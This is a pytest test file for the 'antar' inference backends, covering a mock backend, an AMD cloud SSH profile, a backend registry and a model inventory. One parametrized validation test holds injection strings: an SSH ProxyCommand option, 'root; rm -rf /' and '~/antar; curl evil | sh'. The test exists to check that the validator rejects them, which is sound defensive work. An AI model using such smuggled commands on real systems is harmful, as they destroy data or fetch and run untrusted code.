import asyncio

import httpx
import pytest
from pydantic import ValidationError

from antar.backends.amd_cloud.backend import AmdCloudBackend
from antar.backends.amd_cloud.config import AmdCloudProfile
from antar.backends.base import Availability, SupportLevel
from antar.backends.mock.backend import MockBackend
from antar.backends.registry import build_backends
from antar.config.settings import Settings
from antar.core.errors import CapabilityNotSupportedError, ModelNotFoundError
from antar.core.types import Modality
from antar.inference.types import ChatMessage, ChatRequest, GenerationSettings
from antar.models.inventory import collect_inventory


def _request(model: str = "mock/echo-small", seed: int = 1, max_tokens: int = 128) -> ChatRequest:
    return ChatRequest(
        model=model,
        messages=(ChatMessage(role="user", content="hello there"),),
        settings=GenerationSettings(seed=seed, max_tokens=max_tokens),
    )


def test_mock_chat_is_deterministic_and_flagged_simulated() -> None:
    backend = MockBackend()

    first = asyncio.run(backend.chat(_request()))
    second = asyncio.run(backend.chat(_request()))

    assert first.content == second.content
    assert first.simulated is True
    assert first.metrics.tokens_per_second is None


def test_mock_chat_varies_with_seed_and_respects_max_tokens() -> None:
    backend = MockBackend()

    other = asyncio.run(backend.chat(_request(seed=2)))
    short = asyncio.run(backend.chat(_request(max_tokens=2)))

    assert other.content != asyncio.run(backend.chat(_request())).content
    assert len(short.content.split()) <= 2


def test_mock_stream_ends_with_the_same_result_as_chat() -> None:
    async def collect() -> tuple[str, str]:
        backend = MockBackend()
        streamed, final = "", ""
        async for event in backend.chat_stream(_request()):
            if event.type == "delta":
                streamed += event.content
            else:
                final = event.result.content
        return streamed, final

    streamed, final = asyncio.run(collect())

    assert streamed == final != ""


def test_mock_rejects_unknown_model() -> None:
    with pytest.raises(ModelNotFoundError):
        asyncio.run(MockBackend().chat(_request(model="not-a-model")))


def test_mock_supports_only_text_and_marks_models_simulated() -> None:
    backend = MockBackend()

    supported = {
        capability.modality
        for capability in backend.capabilities()
        if capability.support is SupportLevel.SUPPORTED
    }
    models = asyncio.run(backend.list_models())

    assert supported == {Modality.TEXT}
    assert models
    assert all(model.simulated for model in models)


def test_amd_cloud_is_not_configured_without_profile() -> None:
    status = asyncio.run(AmdCloudBackend(None).status())

    assert status.availability is Availability.NOT_CONFIGURED


def test_amd_cloud_with_profile_reports_not_implemented_and_refuses_inference() -> None:
    profile = AmdCloudProfile(name="lab", ssh_host="gpu.example.com", ssh_user="ubuntu")
    backend = AmdCloudBackend(profile)

    status = asyncio.run(backend.status())

    assert status.availability is Availability.NOT_IMPLEMENTED
    assert status.endpoint == "ssh://ubuntu@gpu.example.com:22"
    assert all(c.support is SupportLevel.PLANNED for c in backend.capabilities())
    with pytest.raises(CapabilityNotSupportedError):
        asyncio.run(backend.chat(_request()))


@pytest.mark.parametrize(
    "overrides",
    [
        {"ssh_host": "-oProxyCommand=evil"},
        {"ssh_host": "host name"},
        {"ssh_user": "root; rm -rf /"},
        {"ssh_port": 70000},
        {"rocm_version": "latest"},
        {"name": "Has Spaces"},
        {"remote_workdir": "~/antar; curl evil | sh"},
    ],
)
def test_amd_cloud_profile_rejects_unsafe_or_malformed_values(overrides: dict[str, object]) -> None:
    values: dict[str, object] = {"name": "lab", "ssh_host": "10.0.0.5", "ssh_user": "ubuntu"}

    with pytest.raises(ValidationError):
        AmdCloudProfile.model_validate({**values, **overrides})


def test_registry_omits_mock_backend_when_disabled(settings: Settings) -> None:
    disabled = settings.model_copy(update={"enable_mock_backend": False})

    assert [backend.name for backend in build_backends(settings)] == [
        "lemonade",
        "amd_cloud",
        "mock",
    ]
    assert [backend.name for backend in build_backends(disabled)] == ["lemonade", "amd_cloud"]


def test_inventory_merges_backends_and_reports_each_source(
    settings: Settings, lemonade_transport: httpx.MockTransport
) -> None:
    backends = build_backends(settings, lemonade_transport=lemonade_transport)

    inventory = asyncio.run(collect_inventory(backends))

    counts = {source.backend: source.model_count for source in inventory.sources}
    assert counts == {"lemonade": 5, "amd_cloud": 0, "mock": 2}
    assert len(inventory.models) == 7


def test_inventory_survives_an_unreachable_backend(
    settings: Settings, offline_transport: httpx.MockTransport
) -> None:
    backends = build_backends(settings, lemonade_transport=offline_transport)

    inventory = asyncio.run(collect_inventory(backends))

    lemonade = next(source for source in inventory.sources if source.backend == "lemonade")
    assert lemonade.availability is Availability.UNAVAILABLE
    assert {model.backend for model in inventory.models} == {"mock"}


def test_inventory_marks_backend_unavailable_when_models_fail_after_health() -> None:
    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path == "/v1/health":
            return httpx.Response(200, json={"status": "ok"})
        return httpx.Response(500)

    from antar.backends.lemonade.backend import LemonadeBackend
    from antar.backends.lemonade.client import LemonadeClient

    backend = LemonadeBackend(LemonadeClient(transport=httpx.MockTransport(handler)))

    inventory = asyncio.run(collect_inventory([backend]))

    assert inventory.sources[0].availability is Availability.UNAVAILABLE
    assert "HTTP 500" in inventory.sources[0].detail
